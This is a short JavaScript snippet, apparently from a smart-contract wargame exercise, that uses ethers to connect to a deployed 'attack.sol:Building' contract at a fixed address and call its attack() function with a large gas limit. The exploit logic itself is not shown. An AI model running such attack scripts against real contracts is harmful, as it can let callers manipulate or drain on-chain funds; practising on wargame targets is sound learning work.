(async() => {
    const contractAdrress = '0x8F9F9E0D39b420eB8bdD1429F331fD2C532a4aAa'
    account = await ethers.getSigner();
    contract = await ethers.getContractAt("contracts/attack.sol:Building", contractAdrress, account);
    tx = await contract.attack({gasLimit: 3e7});
    log(tx)
    await tx.wait();
})();